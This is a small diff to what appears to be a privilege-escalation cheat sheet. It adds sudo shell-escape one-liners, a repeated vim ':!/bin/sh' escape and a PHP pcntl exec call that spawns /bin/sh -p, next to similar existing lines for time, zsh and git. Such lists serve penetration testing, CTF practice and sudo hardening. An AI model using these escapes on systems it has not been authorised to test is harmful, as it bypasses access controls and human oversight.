@@ -31,6 +31,10 @@ sudo time /bin/sh -p
 sudo vim -c ':!/bin/sh'  
 sudo zsh 
 sudo git branch --help config    ..small window then: \!/bin/dash 
+sudo vim -c ':!/bin/sh'  
+
+CMD="/bin/sh"; 
+php7.2 -r "pcntl exec('/bin/sh', ['-p']);" 
 
 =================================== 
 alias ll='ls -lsaht --color=auto'
